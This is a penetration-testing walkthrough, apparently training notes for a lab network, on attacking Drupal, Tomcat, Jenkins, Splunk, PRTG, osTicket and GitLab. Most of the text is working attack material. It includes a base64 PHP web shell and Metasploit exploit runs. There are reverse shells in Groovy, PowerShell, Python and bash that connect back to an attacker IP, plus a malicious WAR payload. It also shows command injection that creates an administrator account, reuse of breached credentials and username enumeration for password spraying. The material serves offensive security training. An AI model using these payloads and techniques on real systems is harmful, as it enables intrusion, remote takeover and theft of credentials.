PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
Step 3 — Modify and Run the Exploit to Upload PHP Shell

Replace the echo command in the exploit script with:

bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

What this does: Decodes the base64 string back to the PHP shell code and writes it to a file named mrb3n.php. Run the modified exploit to upload the PHP file to the target. Then confirm RCE:

bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Drupalgeddon3

Drupalgeddon3 is an authenticated RCE that requires a user with the ability to delete a node. It is exploited using Metasploit after obtaining a valid session cookie by logging in to the Drupal site.

Set Up Metasploit Module
bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

What each option does:

rhosts — the target server IP address
VHOST — the virtual hostname of the Drupal site
drupal_session — the authenticated session cookie captured from a logged-in browser session
DRUPAL_NODE — an existing node number (page/article) that the user has delete permission for
LHOST — your attacker machine IP for the reverse shell callback

Output:

[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612)
meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : app01
OS          : Linux app01 5.4.0-81-generic
Tomcat - Discovery & Enumeration
Tomcat - Discovery & Enumeration

Apache Tomcat is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts, and its popularity grew significantly with Java-based frameworks like Spring and build tools like Gradle. According to BuiltWith data, there are over 220,000 live Tomcat websites and over 904,000 websites have at one point used Tomcat. Tomcat holds position number 13 for web servers by market share, and 1.22% of the top 1 million websites use Tomcat while 3.8% of the top 100k websites do. Organizations using Tomcat include Alibaba, the United States Patent and Trademark Office, The American Red Cross, and the LA Times. Tomcat is less commonly exposed to the internet than other services but is far more common during internal penetration tests and often appears at the top of EyeWitness reports under "High Value Targets" — and it is frequently configured with weak or default credentials.

Discovery/Footprinting

Tomcat servers can be identified by the Server header in the HTTP response. Requesting an invalid page on a Tomcat server reveals the server and version in the 404 error page — for example "Apache Tomcat 9.0.30". If custom error pages are in use, another method is checking the /docs page:

bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat

What this does: Fetches the Tomcat documentation index page which is available by default and has not been removed by many administrators. The output reveals the Tomcat version in the page title:

html
<title>Apache Tomcat 9 (9.0.30) - Documentation Index</title>

The general Tomcat folder structure includes bin/ (scripts and binaries), conf/ (configuration files including tomcat-users.xml which stores credentials), lib/ (JAR files), logs/ and temp/ (log files), webapps/ (default webroot hosting all applications), and work/ (runtime cache). The tomcat-users.xml file is critical — it controls access to the /manager and /host-manager admin pages and stores usernames, passwords, and roles:

xml
<user username="tomcat" password="tomcat" roles="manager-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />

The four built-in Tomcat roles are manager-gui (HTML GUI and status pages), manager-script (HTTP API and status pages), manager-jmx (JMX proxy and status pages), and manager-status (status pages only).

Enumeration

After fingerprinting the Tomcat instance, the primary targets are the /manager and /host-manager pages. Use Gobuster to discover these:

bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

What each flag does:

dir — runs in directory enumeration mode
-u http://web01.inlanefreight.local:8180/ — the target URL including port 8180
-w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt — the wordlist of directory names to try

Output:

/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)

The /manager page is found. Attempt to log in with weak credentials such as tomcat:tomcat, admin:admin, tomcat:admin, etc. If successful, we can upload a WAR file to gain RCE.

The WEB-INF/web.xml deployment descriptor is the most important file in any Tomcat web application — it stores route information and class mappings. The WEB-INF/classes/ folder contains compiled Java classes with business logic and potentially sensitive data. The jsp/ folder stores JSP files comparable to PHP files on Apache.

Attacking Tomcat
Attacking Tomcat

With a Tomcat instance identified and potentially exposed externally, the primary goal is to gain access to the /manager or /host-manager endpoints which allow WAR file deployment and thus Remote Code Execution. The first step is brute-forcing the Tomcat manager login page, and the second step is uploading a malicious WAR file containing a JSP web shell. We will use both Metasploit's tomcat_mgr_login module and a custom Python script to demonstrate brute forcing. We will then create a WAR file using the zip utility, upload it via the manager interface, and interact with the deployed web shell. Additionally, we cover CVE-2020-1938 (Ghostcat), an unauthenticated LFI vulnerability via the AJP protocol affecting all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100.

Tomcat Manager - Login Brute Force
Method 1 — Using Metasploit
bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

What each option does:

VHOST — the virtual hostname of the Tomcat site
RPORT 8180 — the target port (Tomcat is on 8180 here, not the default 8080)
stop_on_success true — stops the scan as soon as valid credentials are found
rhosts — the target IP address

The module uses the default wordlists at /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt. To troubleshoot, proxy through Burp Suite:

bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080

Verify the scanner is working by checking the Authorization header in Burp — it base64-encodes credentials in the format used by Tomcat's basic auth. Decode a sample to verify:

bash
echo YWRtaW46dmFncmFudA== | base64 -d

Output: admin:vagrant

Successful result:

[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
Method 2 — Using Custom Python Script
bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

What each flag does:

-U — the base URL to the Tomcat server
-P /manager — the path to the manager login page
-u — the file containing usernames to try
-p — the file containing passwords to try

Output:

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'

Same result as Metasploit — tomcat:admin confirmed.

Tomcat Manager - WAR File Upload

With valid manager credentials, browse to:

http://web01.inlanefreight.local:8180/manager/html

Log in with tomcat:admin. Download a JSP web shell and package it as a WAR file:

bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

What this does: wget downloads the JSP web shell. zip -r backup.war cmd.jsp packages the JSP file into a WAR archive named backup.war. The -r flag means recursive. Click Browse, select backup.war, and click Deploy in the manager interface.

Execute commands via the deployed web shell:

bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

Output:

Command: id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

After testing, click Undeploy in the Tomcat Manager to remove the backup.war file and associated directory. Note the upload path /opt/tomcat/apache-tomcat-10.0.10/webapps for the report.

Alternative — Use msfvenom to Generate Malicious WAR
bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

What each flag does:

-p java/jsp_shell_reverse_tcp — the Java JSP reverse shell payload
LHOST=10.10.14.15 — your attacker machine IP for the reverse shell
LPORT=4443 — the port your listener will receive the connection on
-f war — output format as WAR file
> backup.war — saves the output to backup.war

Start a listener and deploy the WAR file:

bash
nc -lnvp 4443

Click /backup in the manager to trigger the shell. Output on listener:

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
CVE-2020-1938 : Ghostcat

Ghostcat is an unauthenticated LFI vulnerability affecting all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100. It was caused by a misconfiguration in the AJP protocol (Apache Jserv Protocol) used by Tomcat on port 8009. First confirm the AJP port is open:

bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

What this does: Runs a version scan (-sV) against ports 8009 and 8080 specifically. Output:

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Both ports confirmed open. Exploit using the PoC script to read WEB-INF/web.xml:

bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml

What each flag does:

app-dev.inlanefreight.local — the target hostname
-p 8009 — the AJP port to connect to
-f WEB-INF/web.xml — the file to read (must be within the webapp folder)

The exploit can only read files within the web apps folder — files like /etc/passwd cannot be accessed. However, WEB-INF/web.xml often contains sensitive route and configuration information. Output returns the full XML content of web.xml, confirming the vulnerability.

Jenkins - Discovery & Enumeration
Jenkins - Discovery & Enumeration

Jenkins is an open-source automation server written in Java that helps developers build and test software projects continuously. It was originally named Hudson, released in 2005, and was renamed Jenkins in 2011 after a dispute with Oracle. It is a server-based system that runs in servlet containers such as Tomcat, and over 86,000 companies use Jenkins including Facebook, Netflix, Udemy, Robinhood, and LinkedIn. Jenkins has over 300 plugins to support building and testing projects in virtually any language. Researchers have uncovered various vulnerabilities in Jenkins over the years, including some that allow for remote code execution without requiring authentication. During an internal penetration test, Jenkins is often installed in the context of the root or SYSTEM account, making it an extremely high-value target — gaining access provides not just RCE but often privileged access to the host and the broader domain environment.

Discovery/Footprinting

Jenkins runs on Tomcat port 8080 by default and also utilizes port 5000 to attach slave servers for communication between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts. Jenkins is quickly fingerprintable by its distinctive login page at http://jenkins.inlanefreight.local:8000/login?from=%2F. We may encounter a Jenkins instance using weak or default credentials such as admin:admin, or one with no authentication enabled at all — both are common findings during internal penetration tests.

Enumeration

The default installation typically uses Jenkins' database to store credentials and does not allow users to register an account. Browse to the Jenkins security configuration at:

http://jenkins.inlanefreight.local:8000/configureSecurity/

This shows what authentication mechanism is in use. The login page at http://jenkins.inlanefreight.local:8000/login is a telltale fingerprint of Jenkins. Try weak credentials like admin:admin to gain access. Once logged in, the Script Console at http://jenkins.inlanefreight.local:8000/script is the most direct path to RCE.

Attacking Jenkins
Attacking Jenkins

Once we have gained access to a Jenkins application, the quickest way to achieve command execution on the underlying server is via the Script Console. The Script Console allows running arbitrary Groovy scripts within the Jenkins controller runtime, which can be abused to run operating system commands on the underlying server. Jenkins is often installed as root or SYSTEM, making it an easy privilege win. The Script Console is accessible at http://jenkins.inlanefreight.local:8000/script and accepts Apache Groovy scripts — an object-oriented Java-compatible language similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed. Additionally, Jenkins has several CVE vulnerabilities, including CVE-2018-1999002 and CVE-2019-1003000, which can be combined to achieve pre-authenticated RCE.

Script Console
Step 1 — Execute Commands via Groovy Script

Navigate to http://jenkins.inlanefreight.local:8000/script and enter:

groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

What this does line by line:

def cmd = 'id' — defines the OS command to run
def sout = new StringBuffer(), serr = new StringBuffer() — creates buffers for standard output and standard error
def proc = cmd.execute() — executes the command as a process
proc.consumeProcessOutput(sout, serr) — captures the output into the buffers
proc.waitForOrKill(1000) — waits up to 1000ms for the process to complete
println sout — prints the standard output

Result shown in the Jenkins console:

uid=0(root) gid=0(root)

Jenkins is running as root — maximum privilege.

Step 2 — Get Reverse Shell via Groovy (Linux)
groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

What this does: Uses Java's Runtime.exec() to launch a bash reverse shell. The exec 5<>/dev/tcp/10.10.14.15/8443 opens a TCP connection to the attacker's machine. cat <&5 reads from the connection, the while read line loop executes each received line as a command, and output is redirected back through the TCP connection.

Start listener first:

bash
nc -lvnp 8443

Result:

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
id
uid=0(root) gid=0(root) groups=0(root)
Step 3 — Windows Command Execution via Groovy

For Windows Jenkins instances:

groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");

What this does: Executes the Windows dir command via cmd.exe /c and prints the output. Replace dir with any Windows command.

For a Windows reverse shell use:

groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Replace localhost with your attacker IP and 8044 with your listener port.

Miscellaneous Vulnerabilities

Several remote code execution vulnerabilities exist in various Jenkins versions. CVE-2018-1999002 and CVE-2019-1003000 can be combined to achieve pre-authenticated RCE, bypassing script security sandbox protection during script compilation. This flaw works against Jenkins version 2.137. Another vulnerability in Jenkins 2.150.2 allows users with JOB creation and BUILD privileges to execute code via Node.js — if anonymous users are enabled, the exploit succeeds because these users have those privileges by default. The current LTS release of Jenkins at time of writing is 2.303.1 which fixes both flaws.

Splunk - Discovery & Enumeration
Splunk - Discovery & Enumeration

Splunk is a log analytics tool used to gather, analyze, and visualize data. Though not originally intended as a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk was founded in 2003, became profitable in 2009, and had its IPO in 2012 on NASDAQ under the symbol SPLK. It has over 7,500 employees, annual revenue of nearly $2.4 billion, and was named to the Fortune 1000 list in 2020. Splunk's clients include 92 companies on the Fortune 100 list, and Splunkbase provides over 2,000 available apps and add-ons. Historically, Splunk has not suffered from many known vulnerabilities aside from an information disclosure (CVE-2018-11409) and an authenticated RCE in very old versions (CVE-2011-4642). The biggest security risk with Splunk is weak or null authentication, because admin access gives us the ability to deploy custom applications that can be used to gain RCE and potentially pivot to other hosts in the network.

Discovery/Footprinting

Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme, which are conveniently displayed on the login page. If default credentials do not work, try common weak passwords such as admin, Welcome, Welcome1, Password123, etc. Discover Splunk using Nmap:

bash
sudo nmap -sV 10.129.201.50

What this does: Runs a version detection scan against the target. Output identifies:

8000/tcp open  ssl/http  Splunkd httpd
8089/tcp open  ssl/http  Splunkd httpd

Port 8000 is the Splunk web interface and port 8089 is the Splunk management port for REST API communication.

Enumeration

The Splunk Enterprise trial converts to a free version after 60 days, which does not require authentication at all. This is a common finding — administrators install a trial, forget about it, and it converts to the unauthenticated free version. Once logged in to Splunk (or accessing a Splunk Free instance), we can browse data, run reports, create dashboards, install applications from Splunkbase, and install custom applications. Splunk has multiple ways of running code including server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining RCE is through scripted inputs — these are designed to integrate Splunk with data sources and run scripts with STDOUT provided as input to Splunk. Scripted inputs can be created to run Bash, PowerShell, or Batch scripts, and every Splunk installation comes with Python installed.

Attacking Splunk
Attacking Splunk

Since our target Splunk runs on a Windows server (identified from the Nmap scan), we will create a custom Splunk application containing a PowerShell reverse shell. The application uses inputs.conf to tell Splunk which script to run and a .bat file to execute the PowerShell payload. Every Splunk installation includes Python, so Python reverse shells work on both Windows and Linux targets. The process involves creating the directory structure, writing the reverse shell, creating the inputs.conf configuration file, packaging everything as a tarball, and uploading it via the Splunk web interface. Once uploaded and enabled, the scripted input fires automatically and we receive a reverse shell connection.

Abusing Built-In Functionality
Step 1 — Create Directory Structure
bash
tree splunk_shell/

Output:

splunk_shell/
├── bin
└── default

The bin directory holds the scripts to run and the default directory holds the inputs.conf configuration file.

Step 2 — Create PowerShell Reverse Shell (Windows)

Save the following as splunk_shell/bin/run.ps1:

powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

What this does: Creates a TCP connection to the attacker IP 10.10.14.15 on port 443. Reads commands from the stream, executes them with iex (Invoke-Expression), and sends the output back through the connection.

Step 3 — Create the .bat Launcher File

Save the following as splunk_shell/bin/run.bat:

batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

What this does: Launches PowerShell with execution policy bypass (-exec bypass), hidden window (-w hidden), and runs the .ps1 file located in the same directory (%~dpn0.ps1).

Step 4 — Create inputs.conf

Save the following as splunk_shell/default/inputs.conf:

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

What this does: Tells Splunk which scripts to run. disabled = 0 enables the input. interval = 10 runs the script every 10 seconds. sourcetype = shell defines the data type. The script will only run if the interval setting is present.

Step 5 — Package as Tarball
bash
tar -cvzf updater.tar.gz splunk_shell/

What this does: -c creates an archive, -v verbose output shows files being added, -z compresses with gzip, -f updater.tar.gz sets the output filename. This creates the .spl-compatible package.

Step 6 — Start Listener and Upload

Start listener:

bash
sudo nc -lnvp 443

Navigate to https://10.129.201.50:8000/en-US/manager/search/apps/local, click Install app from file, browse to updater.tar.gz, and click Upload. The app automatically enables and fires the scripted input. Result on listener:

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
APP03

Shell received as NT AUTHORITY\SYSTEM — maximum Windows privilege.

Linux Target — Use Python Reverse Shell Instead

For Linux targets, modify rev.py in the bin folder:

python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

What this does: Imports necessary modules, creates a socket connection to the attacker's IP and port, duplicates the socket file descriptor to stdin (0), stdout (1), and stderr (2), then spawns an interactive bash shell over the connection.

PRTG Network Monitor
PRTG Network Monitor

PRTG Network Monitor is agentless network monitoring software used to monitor bandwidth usage, uptime, and collect statistics from routers, switches, servers, and more. The first version was released in 2003, and in 2015 a free version was released restricted to 100 sensors monitoring up to 20 hosts. PRTG works with an autodiscovery mode to scan network areas and create a device list, gathering further information using protocols such as ICMP, SNMP, WMI, NetFlow, and more. It is used by 300,000 users worldwide, with notable users including Naples International Airport, Virginia Tech, and 7-Eleven. Over the years PRTG has suffered from 26 vulnerabilities assigned CVEs, with only four having easy-to-find public exploits: two XSS, one Denial of Service, and one authenticated command injection (CVE-2018-9276) which we will cover in this section. It is rare to see PRTG exposed externally, but it is commonly found during internal penetration tests.

Discovery/Footprinting/Enumeration

PRTG can typically be found on common web ports such as 80, 443, or 8080. Discover it with Nmap:

bash
sudo nmap -sV -p- --open -T4 10.129.201.50

What each flag does:

-sV — version detection
-p- — scan all 65535 ports
--open — only show open ports
-T4 — faster timing template

Output identifies:

8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)

Confirm the version using cURL:

bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version

What this does: Fetches the PRTG index page with a specific user agent string that causes PRTG to display version info. Output confirms:

PRTG Network Monitor 17.3.33.2830

Browse to the login page at http://10.129.201.50:8080/index.htm. Default credentials are prtgadmin:prtgadmin. If these fail, try variations like prtgadmin:Password123. Version 17.3.33.2830 is likely vulnerable to CVE-2018-9276 — an authenticated command injection in the PRTG System Administrator web console for versions before 18.2.39.

Leveraging Known Vulnerabilities
CVE-2018-9276 — Authenticated Command Injection
Step 1 — Navigate to Notifications

Log in as prtgadmin:Password123. Mouse over Setup → Account Settings → Notifications → click Add new notification.

Step 2 — Configure Malicious Notification

Give the notification a name (e.g., pwn). Scroll down and tick the EXECUTE PROGRAM checkbox. Under Program File, select Demo exe notification - outfile.ps1. In the Parameter field, enter the command injection payload:

test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add

What this does: The parameter field is passed directly into a PowerShell script without sanitization. The semicolons (;) act as command separators in PowerShell. net user prtgadm1 Pwn3d_by_PRTG! /add creates a new local user. net localgroup administrators prtgadm1 /add adds that user to the local Administrators group. Click Save.

Step 3 — Trigger the Notification

Click the Test button next to the saved notification named pwn. A popup says "EXE notification is queued up." Since this is blind command execution we get no direct feedback.

Step 4 — Verify Local Admin Access
bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!

What this does: Uses CrackMapExec to test SMB authentication with the newly created credentials. Output:

SMB  10.129.201.50  445  APP03  [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)

Local admin access confirmed on the target. The (Pwn3d!) tag confirms administrator-level access.

osTicket
osTicket

osTicket is an open-source support ticketing system comparable to Jira, OTRS, Request Tracker, and Spiceworks. It integrates user inquiries from email, phone, and web-based forms into a web interface. osTicket is written in PHP and uses a MySQL backend, installable on Windows or Linux. A Google search returns about 44,000 results for companies, school systems, universities, and local government using osTicket. The purpose of this section is both to teach enumeration and attack of osTicket and to introduce the world of support ticketing systems and why they should not be overlooked during assessments. osTicket can be identified by the OSTSESSID cookie name, the osTicket logo with "powered by" text in the page footer, and the words "Support Ticket System" in the footer. A search for CVEs on osTicket shows few vulnerabilities as it is well-maintained, including SSRF (CVE-2020-24881). However, the most valuable attack against osTicket is a social engineering and email-based technique.

Footprinting/Discovery/Enumeration

osTicket is identified by browsing to the support portal URL and looking for the OSTSESSID cookie, the osTicket logo in the footer saying "powered by osTicket", or the phrase "Support Ticket System". An Nmap scan shows only the webserver (Apache or IIS) and does not identify osTicket specifically. The core functions can be broken into three layers: User Input (users submit problems through the portal), Processing (staff reproduce issues in isolated environments), and Solution (technical staff from various departments become involved in email correspondence, revealing new email addresses and potential usernames for OSINT).

Attacking osTicket
Obtaining a Company Email via Ticket Creation

If we find an exposed osTicket portal during an assessment, we can submit a new ticket and receive a valid company email address assigned to that ticket. Browse to the support portal and open a new ticket:

http://support.inlanefreight.local/open.php

Fill in contact details and submit. The confirmation page reveals:

Support ticket request created
Ticket ID: 940288
Email: 940288@inlanefreight.local

This is a real inlanefreight.local email address assigned to our ticket. If the company has services that require email verification (Slack, GitLab, Mattermost, etc.), we can use this email to register and receive the confirmation via the ticket portal at:

http://support.inlanefreight.local/open.php

View ticket replies and any email sent to 940288@inlanefreight.local appears in the ticket thread.

osTicket - Sensitive Data Exposure
Step 1 — Use Dehashed to Find Leaked Credentials
bash
sudo python3 dehashed.py -q inlanefreight.local -p

What this does: Queries the Dehashed breach database for entries matching inlanefreight.local, showing -p for plaintext passwords where available. Output reveals leaked credentials including jclayton:JulieC8765! and kgrimes:Fish1ng_s3ason!.

Step 2 — Enumerate Subdomains
bash
cat ilfreight_subdomains

Output lists subdomains including support.inlanefreight.local and vpn.inlanefreight.local as active targets.

Step 3 — Log in to osTicket with Found Credentials

Browse to http://support.inlanefreight.local/scp/login.php. Try jclayton — fails. Try kgrimes — fails. Try kevin@inlanefreight.local as the email — success. Log in as the support agent Kevin.

Step 4 — Find Sensitive Data in Closed Tickets

Browse through closed tickets. Find a conversation where a support agent sent a password directly to a user via the portal. This is the standard new joiner password. Try this password against the exposed VPN portal at vpn.inlanefreight.local. The password may still be valid if the user never changed it. Also export all email addresses from the address book for use in password spraying attacks against the VPN endpoint.

Gitlab - Discovery & Enumeration
Gitlab - Discovery & Enumeration

GitLab is a web-based Git-repository hosting tool providing wiki capabilities, issue tracking, and CI/CD pipeline functionality. It is open-source, originally written in Ruby, with the current stack including Go, Ruby on Rails, and Vue.js. GitLab was first launched in 2014 and has grown into a 1,400-person company with $150 million revenue in 2020. At time of writing the company has 1,466 employees, over 30 million registered users in 66 countries, and is used by companies including Drupal, Goldman Sachs, Hackerone, Ticketmaster, Nvidia, and Siemens. During penetration tests, Git repositories may contain publicly available code, scripts with hardcoded credentials, SSH private keys, API keys, or configuration files with secrets — all extremely valuable to an attacker. GitLab supports public repositories (no auth required), internal repositories (authenticated users only), and private repositories (specific users only).

Footprinting & Discovery

GitLab is quickly identified by browsing to the GitLab URL which redirects to the login page displaying the GitLab logo at http://gitlab.inlanefreight.local:8081/users/sign_in. The only way to footprint the GitLab version number is by browsing to the /help page when logged in. If the GitLab instance allows registration, log in and browse to /help to confirm the version. Two-factor authentication is disabled by default on GitLab.

Enumeration
Step 1 — Browse Public Projects

Without being logged in, browse to /explore:

http://gitlab.inlanefreight.local:8081/explore

This shows any public projects. A project called "Inlanefreight dev" is visible. Public projects may contain source code, hard-coded credentials, SSH private keys, or API keys.

Step 2 — Register an Account for Internal Access

If the GitLab instance allows self-registration, browse to:

http://gitlab.inlanefreight.local:8081/users/sign_up

Register with credentials hacker:Welcome. Once logged in, browse to /explore again — an additional internal project "Inlanefreight website" is now visible that was not accessible before.

Step 3 — Username Enumeration via Registration Form

The registration form can be used to enumerate valid usernames. If we try to register with username root:

Error: Username is already taken

This confirms root is a valid existing user. The same technique works for email addresses — if an email is already taken, the error "Email has already been taken" confirms it exists. This technique works even if sign-up is disabled — the /users/sign_up page is still accessible for enumeration.

Attacking GitLab
Attacking GitLab

Even unauthenticated access to a GitLab instance can lead to sensitive data compromise. GitLab has 553 CVEs reported as of September 2021, with several severe ones leading to remote code execution. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated RCE due to ExifTool mishandling metadata in uploaded image files. Username enumeration can also be leveraged to mount password spraying attacks. GitLab's defaults in versions below 16.6 allow 10 failed login attempts before a 10-minute automatic lockout — this must be considered when brute-forcing. Starting with GitLab version 16.6, administrators can configure these values through the admin UI using max_login_attempts and failed_login_attempts_unlock_period_in_minutes.

Username Enumeration

Use the enumeration script to find valid usernames:

bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

What each flag does:

--url — the target GitLab URL
--userlist users.txt — a file containing usernames to test

Output:

[+] The username root exists!
[+] The username bob exists!

Valid users root and bob confirmed. These can now be targeted with a controlled password spraying attack using common weak passwords like Welcome1 or Password123, or re-using credentials found from breach databases.

Authenticated Remote Code Execution

GitLab CE version 13.10.2 and lower is vulnerable to an authenticated RCE due to ExifTool mishandling metadata in uploaded image files (CVE not specified in content). If the instance allows self-registration, register an account and immediately use it for the exploit:

bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

What each flag does:

-t http://gitlab.inlanefreight.local:8081 — the target GitLab URL
-u mrb3n — the registered username
-p password1 — the account password
-c '...' — the command to execute (a bash reverse shell one-liner using mkfifo)

Exploit steps the script performs:

Authenticates with the provided credentials
Creates a payload image file with malicious ExifTool metadata
Uploads the payload as a snippet attachment
Triggers ExifTool processing which executes the embedded command

Start listener first:

bash
nc -lnvp 8443

Output:

[1] Authenticating
Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
[+] RCE Triggered !!

Shell received:

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
git@app04:~/gitlab-workhorse$ id
uid=996(git) gid=997(git) groups=997(git)
git@app04:~/gitlab-workhorse$ ls
VERSION
config.toml
flag_gitlab.txt
sockets

Shell confirmed as the git user on the GitLab server.

Attacking Tomcat CGI
Attacking Tomcat CGI

CVE-2019-0232 is a critical security issue affecting Windows systems with the enableCmdLineArguments feature enabled on Apache Tomcat's CGI Servlet. It affects Tomcat versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93. The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM — typically CGI scripts written in Perl, Python, or Bash. The enableCmdLineArguments setting controls whether command line arguments are created from the query string; when set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments. On Windows systems, this fails to properly validate input from the web browser before passing it to the CGI script, leading to OS command injection by appending commands using & as a separator.

Enumeration
Step 1 — Nmap Scan
bash
nmap -p- -sC -Pn 10.129.204.227 --open

What each flag does:

-p- — scan all 65535 ports
-sC — run default NSE scripts
-Pn — skip host discovery (assume host is up)
--open — only show open ports

Output identifies:

8009/tcp open  ajp13
8080/tcp open  http-proxy  Apache Tomcat/9.0.17

Apache Tomcat 9.0.17 is running on port 8080 — within the vulnerable range for CVE-2019-0232.

Finding a CGI script
Step 2 — Fuzz for .CMD Extensions
bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

